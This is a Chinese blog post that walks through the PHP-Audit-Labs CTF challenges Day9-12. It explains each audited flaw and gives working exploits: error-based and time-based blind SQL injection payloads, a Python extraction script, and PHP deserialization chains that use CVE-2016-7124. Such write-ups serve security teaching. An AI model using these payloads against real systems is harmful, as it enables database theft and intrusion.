<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.9.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="PHP-Audit-Labs题解之Day9-12"><meta name="keywords" content="PHP-Audit-Labs"><meta name="author" content="Mochazz"><meta name="copyright" content="Mochazz"><title>PHP-Audit-Labs题解之Day9-12 | Mochazz's blog</title><link rel="shortcut icon" href="/favicon.png"><link rel="stylesheet" href="/css/index.css?version=1.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.6.1"><link rel="dns-prefetch" href="https://cdn.staticfile.org"><link rel="dns-prefetch" href="https://cdn.bootcss.com"><link rel="dns-prefetch" href="https://creativecommons.org"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  }
} </script></head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day9题解：-By-七月火"><span class="toc-number">2.</span> <span class="toc-text">Day9题解：(By 七月火)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day10题解：-By-七月火"><span class="toc-number">3.</span> <span class="toc-text">Day10题解：(By 七月火)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day11题解：-By-licong"><span class="toc-number">4.</span> <span class="toc-text">Day11题解：(By licong)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day-12题解：-By-l1nk3r"><span class="toc-number">5.</span> <span class="toc-text">Day-12题解：(By l1nk3r)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#第一部分"><span class="toc-number">5.1.</span> <span class="toc-text">第一部分</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#第二部分"><span class="toc-number">5.2.</span> <span class="toc-text">第二部分</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-number">6.</span> <span class="toc-text">总结</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.jpg"></div><div class="author-info__name text-center">Mochazz</div><div class="author-info__description text-center">人若无名，方可潜心练剑</div><div class="follow-button"><a href="https://github.com/Mochazz">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">226</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">89</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">分类</span><span class="pull-right">20</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Links</div><a class="author-info-links__name text-center" href="http://www.lmxspace.com">l1nk3r</a><a class="author-info-links__name text-center" href="https://www.virzz.com">Virink</a><a class="author-info-links__name text-center" href="https://www.kingkk.com">kingkk</a><a class="author-info-links__name text-center" href="https://hpdoger.cn">hpdoger</a><a class="author-info-links__name text-center" href="https://www.smi1e.top">smi1e</a><a class="author-info-links__name text-center" href="http://m4p1e.com">maple</a><a class="author-info-links__name text-center" href="https://zhzhdoai.github.io">osword</a><a class="author-info-links__name text-center" href="https://nikoeurus.github.io">Somnus</a><a class="author-info-links__name text-center" href="https://landgrey.me">LandGrey</a><a class="author-info-links__name text-center" href="https://www.cnpanda.net">panda</a><a class="author-info-links__name text-center" href="http://foreversong.cn">ADog</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(/img/backgroud.jpeg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Mochazz's blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/about">About</a><a class="site-page" href="/read">Read</a></span></div><div id="post-info"><div id="post-title">PHP-Audit-Labs题解之Day9-12</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2018-09-30</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/代码审计/">代码审计</a></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>大家好，我们是红日安全-代码审计小组。最近我们小组正在做一个PHP代码审计的项目，供大家学习交流，我们给这个项目起了一个名字叫 <a href="https://github.com/hongriSec/PHP-Audit-Labs" target="_blank" rel="noopener"> <strong>PHP-Audit-Labs</strong> </a> 。在每篇文章的最后，我们都留了一道CTF题目，供大家练习。下面是 <strong>Day9-Day12</strong> 的题解：</p>
<h2 id="Day9题解：-By-七月火"><a href="#Day9题解：-By-七月火" class="headerlink" title="Day9题解：(By 七月火)"></a>Day9题解：(By 七月火)</h2><p>题目如下：</p>
<p><img src="/img/PHP-Audit-Labs/PHP-Audit-Labs%E9%A2%98%E8%A7%A3/Day9-12/1.png" alt="1"></p>
<p><img src="/img/PHP-Audit-Labs/PHP-Audit-Labs%E9%A2%98%E8%A7%A3/Day9-12/2.png" alt="2"></p>
<p>实际上这题是以齐博CMS的漏洞为原型改造的，让我们具体来看一下漏洞是如何产生的。题目提供了一个留言版功能，并且对用户提交的留言进行 <strong>HTML实体编码转换</strong> 、 <strong>特殊字符转义</strong> 、 <strong>违禁词过滤</strong> 等处理，然后直接与sql语句进行拼接操作(下图第5行)，具体代码如下：</p>
<p><img src="/img/PHP-Audit-Labs/PHP-Audit-Labs%E9%A2%98%E8%A7%A3/Day9-12/3.png" alt="3"></p>
<p>这些转换函数都可以在 <strong>function.php</strong> 文件中找到，我们很明显可以看到在第16-19行处进行了全局变量注册，这样就很容易引发变量覆盖问题。在第14行处定义了需要替换的违禁词数组，并在 <strong>replace_bad_word</strong> 函数中进行替换。这里，我们便可以通过覆盖 <strong>$limit_words</strong> 数组，来逃逸单引号，因为在 <strong>index.php</strong> 文件中使用了 <strong>addslashes</strong> 函数。</p>
<p><img src="/img/PHP-Audit-Labs/PHP-Audit-Labs%E9%A2%98%E8%A7%A3/Day9-12/2.png" alt="4"></p>
<p>我们使用第一个 <strong>payload</strong> 如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msg=1%00<span class="string">' and updatexml(1,concat(0x7e,(select * from flag),0x7e),1))#&amp;limit_words[\0\]=</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/PHP-Audit-Labs/PHP-Audit-Labs%E9%A2%98%E8%A7%A3/Day9-12/4.png" alt="5"></p>
<p>这样我们便注出了flag，但是这里的flag并不齐全，因为 <strong>updatexml报错</strong> 最多只能显示 <strong>32位</strong> ，所以下面我使用 <strong>reverse</strong> 函数注出尾部数据。当然方法不止这一种，大家自己举一反三。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msg=1%00<span class="string">' and updatexml(1,concat(0x7e,(select reverse(flag) from flag),0x7e),1))#&amp;limit_words[\0\]=</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/PHP-Audit-Labs/PHP-Audit-Labs%E9%A2%98%E8%A7%A3/Day9-12/5.png" alt="6"></p>
<h2 id="Day10题解：-By-七月火"><a href="#Day10题解：-By-七月火" class="headerlink" title="Day10题解：(By 七月火)"></a>Day10题解：(By 七月火)</h2><p>题目如下：</p>
<p><img src="/img/PHP-Audit-Labs/PHP-Audit-Labs%E9%A2%98%E8%A7%A3/Day9-12/6.png" alt="7"></p>
<p>本次题目源于某CMS <strong>0day</strong> 漏洞改编。很明显可以看到在上图代码 <strong>第29行</strong> 处进行了 <strong>SQL</strong> 语句拼接，然后直接带入数据库查询。而在前一行，其实是有对 <strong>GET</strong> 方式传来的参数 <strong>id</strong> 进行过滤的，我们来详细看看过滤函数 <strong>stophack</strong> 。</p>
<p>我们可以清楚的看到 <strong>stophack</strong> 函数存在 <strong>过滤不严</strong> 和 <strong>检测到非法字符未直接退出</strong> 两个问题。</p>
<p><img src="/img/PHP-Audit-Labs/PHP-Audit-Labs%E9%A2%98%E8%A7%A3/Day9-12/7.png" alt="8"></p>
<p>程序如果检测到非法字符或单词，都会将其替换成字符串 <strong>HongRi</strong> ，然而并没有立即退出，这样攻击者输入的攻击语句还是会继续被带入数据库查询。只不过这里关键词都被替换成了字符串 <strong>HongRi</strong> ，所以我们需要绕过这里的黑名单。纵观整个程序，当 <strong>SQL</strong> 语句执行出错时，并不会将错误信息显示出来，所以此处应为盲注。开发者估计也是考虑到这个问题，便将关键词 <strong>sleep</strong> 给过滤了，然而这并不能影响攻击者继续使用盲注来获取数据。关于禁用了 <strong>sleep</strong> 函数的盲注，大家可以直接参考这篇文章：<a href="https://xz.aliyun.com/t/2288" target="_blank" rel="noopener">mysql 延时注入新思路</a> 。这里我直接利用 <strong>benchmark</strong> 函数来获取flag。python程序如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys, string, requests</span><br><span class="line"></span><br><span class="line">version_chars = <span class="string">".-&#123;&#125;_"</span> + string.ascii_letters + string.digits + <span class="string">'#'</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">40</span>):</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> version_chars:</span><br><span class="line">        payload = <span class="string">"-1 or if(ascii(mid((select flag from flag),%s,1))=%s,benchmark(200000000,7^3^8),0)"</span> % (i,ord(char))</span><br><span class="line">        url = <span class="string">"http://localhost/index.php?id=%s"</span> % payload</span><br><span class="line">        <span class="keyword">if</span> char == <span class="string">'#'</span>:</span><br><span class="line">            <span class="keyword">if</span>(flag):</span><br><span class="line">                sys.stdout.write(<span class="string">"\n[+] The flag is： %s"</span> % flag)</span><br><span class="line">                sys.stdout.flush()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">"[-] Something run error!"</span>)</span><br><span class="line">            exit()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url=url, timeout=<span class="number">2.0</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            flag += char</span><br><span class="line">            sys.stdout.write(<span class="string">"\r[-] Try to get flag： %s"</span> % flag)</span><br><span class="line">            sys.stdout.flush()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(<span class="string">"[-] Something run error!"</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/img/PHP-Audit-Labs/PHP-Audit-Labs%E9%A2%98%E8%A7%A3/Day9-12/8.png" alt="9"></p>
<h2 id="Day11题解：-By-licong"><a href="#Day11题解：-By-licong" class="headerlink" title="Day11题解：(By licong)"></a>Day11题解：(By licong)</h2><p>这道题主要考察对php反序列化函数的利用，以及常见的绕过方法。</p>
<p><img src="/img/PHP-Audit-Labs/PHP-Audit-Labs%E9%A2%98%E8%A7%A3/Day9-12/9.png" alt="1"></p>
<p>访问<strong>flag.php</strong>,显示禁止访问，题目默认显示源码，在下图<strong>代码57行</strong>，数据库查询内容不为空的情况下，定义常量<strong>IN_FLAG</strong>，猜测需要满足该条件才能访问<strong>flag.php</strong>。然后调用<strong>loadData</strong>函数。</p>
<p><img src="/img/PHP-Audit-Labs/PHP-Audit-Labs%E9%A2%98%E8%A7%A3/Day9-12/10.png" alt="2"></p>
<p><strong>loadData</strong>函数，对传入参数进行判断，如果验证通过，则作为参数传入到反序列化函数，验证不通过返回为空，该判断绕过可参考Day11,传入内容来源于数据库查询结果，此时可考虑如何构造数据库查询结果。</p>
<p><img src="/img/PHP-Audit-Labs/PHP-Audit-Labs%E9%A2%98%E8%A7%A3/Day9-12/11.png" alt="3"></p>
<p>在<strong>index.php</strong>页面显示源码中，我们发现<strong>SoFun</strong>类,如下图，在<strong>__destruct()</strong>函数中，会对类变量<strong>$this-&gt;file</strong>所对应的文件进行包含，类变量反序列化可控，在<strong>loadData</strong>函数调用前，对<strong>IN_FLAG</strong>常量进行了设置，如果<strong>loadData</strong>函数传入参数值为<strong>SoFun</strong>类反序列化字符串，且控制类变量<strong>$this-&gt;file=flag.php</strong>，则可以包含flag.php文件，此时<strong>‘IN_FLAG’</strong>已经设置，可获取到flag，需考虑绕过<strong>__wakeup</strong>函数。</p>
<p><img src="/img/PHP-Audit-Labs/PHP-Audit-Labs%E9%A2%98%E8%A7%A3/Day9-12/12.png" alt="4"></p>
<p>考虑如何控制<strong>loadData</strong>函数传入参数的值，从下图可知，<strong>$obj-&gt;role</strong>来源于数据库查询结果，而构建sql语句的username字段来源于<strong>$username</strong>,<strong>$username</strong>变量来源于<strong>func_get_args()函数</strong>,该函数返回包含调用函数参数列表的数组,如果<strong>login()</strong>函数传入参数可控，可通过<strong>union联合查询</strong>，构造查询结果，使构造数据为SoFun类序列化字符串。我们去看一下login函数的调用。</p>
<p><img src="/img/PHP-Audit-Labs/PHP-Audit-Labs%E9%A2%98%E8%A7%A3/Day9-12/10.png" alt="2"></p>
<p>在<strong>HINCON</strong>类<strong>__destruct</strong>方法中，通过<strong>call_user_func_array()</strong>函数调用login或source方法，如果<strong>$this-&gt;method=’login’</strong>则可以调用<strong>login()</strong>函数，<strong>$this-&gt;method</strong>为类变量，反序列化可控。<strong>$this-&gt;args</strong>为调用函数传入参数，意味着login函数中$username变量可控，此时可通过SQL注入，构造查询数据。</p>
<p><img src="/img/PHP-Audit-Labs/PHP-Audit-Labs%E9%A2%98%E8%A7%A3/Day9-12/13.png" alt="5"></p>
<p>在进行反序列化时，会调用<strong>__wakeup</strong>对类变量args进行处理，此时调用<strong>mysql_escape_string</strong>函数对<strong>$this-&gt;args</strong>进行转义。可通过<strong>CVE-2016-7124</strong>，序列化字符串中，如果表示对象属性个数的值大于真实的属性个数时就会跳过<strong>__wakeup</strong>的执行。绕过检测，进行sql注入。</p>
<p><img src="/img/PHP-Audit-Labs/PHP-Audit-Labs%E9%A2%98%E8%A7%A3/Day9-12/14.png" alt="6"></p>
<p>总结一下思路：</p>
<p>1.构造<strong>HITCON</strong>类反序列化字符串，其中<strong>$method=’login’</strong>,<strong>$args</strong>数组’username’部分可用于构造SQL语句，进行SQL注入，’password’部分任意设置。</p>
<p>2.调用<strong>login()</strong>函数后，利用<strong>$username</strong>构造联合查询，使查询结果为<strong>SoFun类</strong>反序列化字符串，设置<strong>$file=’flag.php’</strong>，需绕过<strong>__wakeup()</strong>函数。</p>
<p>3.绕过<strong>LoadData()</strong>函数对反序列化字符串的验证,参考Day11。</p>
<p>4.SoFun类 <strong>__destruct()</strong>函数调用后,包含flag.php文件，获取flag，需绕过<strong>__wakeup()函数</strong>。</p>
<p>第二个答案是另一种思路，大家可研究一下。</p>
<p>注：因为传参方式为GET，注意进行URL编码。</p>
<p>参考答案：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">6</span>:<span class="string">"HITCON"</span>:<span class="number">3</span>:&#123;s:<span class="number">6</span>:<span class="string">"method"</span>;s:<span class="number">5</span>:<span class="string">"login"</span>;s:<span class="number">4</span>:<span class="string">"args"</span>;a:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">"username"</span>;s:<span class="number">81</span>:<span class="string">"1' union select 1,2,'a:1:&#123;s:2:"</span>xx<span class="string">";O:%2b5:"</span>SoFun<span class="string">":2:&#123;s:4:"</span>file<span class="string">";s:8:"</span>flag.php<span class="string">";&#125;&#125;'%23"</span>;s:<span class="number">8</span>:<span class="string">"password"</span>;s:<span class="number">3</span>:<span class="string">"234"</span>;&#125;&#125;</span><br><span class="line">O:<span class="number">5</span>:<span class="string">"SoFun"</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"file"</span>;s:<span class="number">8</span>:<span class="string">"flag.php"</span>;&#125;</span><br><span class="line">a:<span class="number">1</span>:&#123;s:<span class="number">2</span>:<span class="string">"xx"</span>;O:<span class="number">5</span>:<span class="string">"SoFun"</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">"file"</span>;s:<span class="number">8</span>:<span class="string">"flag.php"</span>;&#125;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">5</span>:<span class="string">"SoFun"</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">"file"</span>;s:<span class="number">8</span>:<span class="string">"flag.php"</span>;s:<span class="number">2</span>:<span class="string">"ff"</span>;O:<span class="number">6</span>:<span class="string">"HITCON"</span>:<span class="number">5</span>:&#123;s:<span class="number">6</span>:<span class="string">"method"</span>;s:<span class="number">5</span>:<span class="string">"login"</span>;s:<span class="number">4</span>:<span class="string">"args"</span>;a:<span class="number">2</span>:&#123;i:<span class="number">0</span>;s:<span class="number">12</span>:<span class="string">"1' or '1'--+"</span>;i:<span class="number">1</span>;s:<span class="number">3</span>:<span class="string">"111"</span>;&#125;s:<span class="number">4</span>:<span class="string">"conn"</span>;N;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/img/PHP-Audit-Labs/PHP-Audit-Labs%E9%A2%98%E8%A7%A3/Day9-12/15.png" alt="7"></p>
<h2 id="Day-12题解：-By-l1nk3r"><a href="#Day-12题解：-By-l1nk3r" class="headerlink" title="Day-12题解：(By l1nk3r)"></a>Day-12题解：(By l1nk3r)</h2><p>题目如下：</p>
<p><img src="/img/PHP-Audit-Labs/PHP-Audit-Labs%E9%A2%98%E8%A7%A3/Day9-12/16.png" alt="16"></p>
<p>从代码 <strong>第27行</strong> 很明显，这道题考查sql注入，但是这里有两个考察点，我们分别来看一下。</p>
<h3 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h3><p> <strong>第23行</strong> 和 <strong>第24行</strong> 针对 <strong>GET</strong> 方式获取到的 <strong>username</strong> 和 <strong>password</strong> 进行了处理，处理函数为 <strong>clean</strong> 。该函数在 <strong>第16-20行</strong> 处定义，函数的主要功能就是使用 <strong>htmlentities</strong> 函数处理变量中带有的特殊字符，而这里加入了 <strong>htmlentities</strong> 函数的可选参数 <strong>ENT_QUOTES</strong> ，因此这里会对 <strong>单引号</strong> ， <strong>双引号</strong> 等特殊字符进行转义处理。由于这里的注入是字符型的，需要闭合单引号或者逃逸单引号，因此这里需要绕过这个函数。我们可以通过下面这个例子观察 <strong>clean</strong> 函数的处理效果：</p>
<p><img src="/img/PHP-Audit-Labs/PHP-Audit-Labs%E9%A2%98%E8%A7%A3/Day9-12/17.png" alt="17"></p>
<p>题目 <strong>第36行</strong> 是进入数据库查询，并且返回 <strong>name</strong> 列字段的值。而这里的sql语句是这样的：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$query=<span class="string">'SELECT * FROM ctf.users WHERE name=\''</span>.$username.<span class="string">'\' </span></span><br><span class="line"><span class="string">AND pass=\''</span>.$password.<span class="string">'\';'</span>;</span><br></pre></td></tr></table></figure>

<p>那我们如果输入的 <strong>username</strong> 是 <strong>admin</strong> ， <strong>password</strong> 是 <strong>admin</strong> ，自然就构成了正常要执行的sql语句。</p>
<p><img src="/img/PHP-Audit-Labs/PHP-Audit-Labs%E9%A2%98%E8%A7%A3/Day9-12/18.png" alt="18"></p>
<p>这道题的问题就在于可以引入反斜杠，也就是转义符，官方针对 <a href="http://php.net/manual/zh/regexp.reference.escape.php" target="_blank" rel="noopener">转义符</a> 是这么解释的。</p>
<blockquote>
<p>比如，如果你希望匹配一个 “*” 字符，就需要在模式中写为 <code>\*</code>。 这适用于一个字符在不进行转义会有特殊含义的情况下。</p>
</blockquote>
<p>这里我们看个简单的例子理解一下这个转义符号。</p>
<p><img src="/img/PHP-Audit-Labs/PHP-Audit-Labs%E9%A2%98%E8%A7%A3/Day9-12/26.png" alt="26"></p>
<p>转义符号会让当前的特殊符号失去它的作用，这道题由于可以引入反斜杠，也就是转义符号，来让</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$query=<span class="string">'SELECT * FROM ctf.users WHERE name=\''</span>.$username.<span class="string">'\' </span></span><br><span class="line"><span class="string">AND pass=\''</span>.$password.<span class="string">'\';'</span>;</span><br></pre></td></tr></table></figure>

<p><strong>username</strong>后面的 <strong>‘</strong> 失效，只要这个 <strong>‘</strong> 失效，就能闭合<strong>pass=</strong>后面的 <strong>‘</strong>。最后组合的payload就如下图所示</p>
<p><img src="/img/PHP-Audit-Labs/PHP-Audit-Labs%E9%A2%98%E8%A7%A3/Day9-12/19.png" alt="19"></p>
<p>所以实际上目前 <strong>name</strong> 的值是 <strong>admin\‘ AND pass=</strong> ,这时候 <strong>password</strong> 的值是一个可控的输入点，我们可以通过这个值来构造 <strong>sql</strong> 的 <strong>联合查询</strong> ，并且注释掉最后的 <strong>单引号</strong> 。</p>
<p><img src="/img/PHP-Audit-Labs/PHP-Audit-Labs%E9%A2%98%E8%A7%A3/Day9-12/20.png" alt="20"></p>
<p>最后我们看看在mysql中执行的结果。</p>
<p><img src="/img/PHP-Audit-Labs/PHP-Audit-Labs%E9%A2%98%E8%A7%A3/Day9-12/21.png" alt="21"></p>
<h3 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h3><p>好了第一部分我们其实已经成功构造好了payload，但是回头来看看题目，题目 <strong>第6行</strong> 到 <strong>第16行</strong> 有两个正则表达式，作用就是如果参数中带有 <strong>or、and 、union</strong> 等数据，就退出，并输出 <strong>Attack detected!!!</strong> </p>
<p><img src="/img/PHP-Audit-Labs/PHP-Audit-Labs%E9%A2%98%E8%A7%A3/Day9-12/22.png" alt="22"></p>
<p>这里当然我们可以正面硬刚这个正则表达式。但是这里我们来聊一个比较有趣的解法。</p>
<p>我们看到是通过 <strong>request</strong> 方式传入数据，而php中 <a href="http://php.net/manual/zh/reserved.variables.request.php" target="_blank" rel="noopener">REQUEST</a> 变量默认情况下包含了 <strong>GET</strong> ，<strong>POST</strong> 和 <strong>COOKIE</strong> 的数组。在 <strong>php.ini</strong> 配置文件中，有一个参数 <strong>variables_order</strong> ，这参数有以下可选项目</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">; variables_order</span><br><span class="line">;   Default Value: &quot;EGPCS&quot;</span><br><span class="line">;   Development Value: &quot;GPCS&quot;</span><br><span class="line">;   Production Value: &quot;GPCS&quot;</span><br></pre></td></tr></table></figure>

<p>这些字母分别对应的是 <strong>E: Environment</strong> ，<strong>G:Get</strong>，<strong>P:Post</strong>，<strong>C:Cookie</strong>，<strong>S:Server</strong>。这些字母的出现顺序，表明了数据的加载顺序。而 <strong>php.ini</strong> 中这个参数默认的配置是 <strong>GPCS</strong> ，也就是说如果以 <strong>POST</strong> 、 <strong>GET</strong> 方式传入相同的变量，那么用 <strong>REQUEST</strong> 获取该变量的值将为 <strong>POST</strong> 该变量的值。</p>
<p><img src="/img/PHP-Audit-Labs/PHP-Audit-Labs%E9%A2%98%E8%A7%A3/Day9-12/23.png" alt="23"></p>
<p>我们举个简单的例子方便大家理解：</p>
<p><img src="/img/PHP-Audit-Labs/PHP-Audit-Labs%E9%A2%98%E8%A7%A3/Day9-12/24.png" alt="24"></p>
<p>我们可以看到这里的 <strong>post</strong> 方式传入的数据覆盖了 <strong>get</strong> 方式传入的数据，因此这里最后的payload如下：</p>
<p><img src="/img/PHP-Audit-Labs/PHP-Audit-Labs%E9%A2%98%E8%A7%A3/Day9-12/25.png" alt="25"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>我们的项目会慢慢完善，如果大家喜欢可以关注 <a href="https://github.com/hongriSec/PHP-Audit-Labs" target="_blank" rel="noopener"> <strong>PHP-Audit-Labs</strong> </a> 。大家若是有什么更好的解法，可以在文章底下留言，祝大家玩的愉快！</p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Mochazz</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://mochazz.github.io/2018/09/30/PHP-Audit-Labs题解之Day9-12/">https://mochazz.github.io/2018/09/30/PHP-Audit-Labs题解之Day9-12/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://mochazz.github.io">Mochazz's blog</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/PHP-Audit-Labs/">PHP-Audit-Labs</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2018/09/30/DuomiCms3.0最新版漏洞挖掘/"><i class="fa fa-chevron-left">  </i><span>DuomiCms3.0最新版漏洞挖掘</span></a></div><div class="next-post pull-right"><a href="/2018/09/27/渗透测试之绕过PHP的disable_functions/"><span>渗透测试之绕过PHP的disable_functions</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="vcomment"></div><script src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js"></script><script>var notify = 'true' == true ? true : false;
var verify = 'false' == true ? true : false;
var GUEST_INFO = ['nick','mail','link'];
var guest_info = 'nick,mail,link'.split(',').filter(function(item){
  return GUEST_INFO.indexOf(item) > -1
});
guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
window.valine = new Valine({
  el:'#vcomment',
  notify:notify,
  verify:verify,
  appId:'cFxDjSziPHq4xGCbSpRGkND7-gzGzoHsz',
  appKey:'YhJIRxQHzY9Aix5pSGnYxKkv',
  placeholder:'ヾﾉ≧∀≦)o留下评论再走吧',
  avatar:'wavatar',
  guest_info:guest_info,
  pageSize:'10',
  lang: 'zh-cn'
})</script></div></div><footer class="footer-bg" style="background-image: url(/img/backgroud.jpeg)"><div class="layout" id="footer"><div class="copyright">&copy;2017 - 2020 By Mochazz</div><div class="framework-info"><span>驱动 - </span><a href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file-o"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script>if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
}</script></body></html>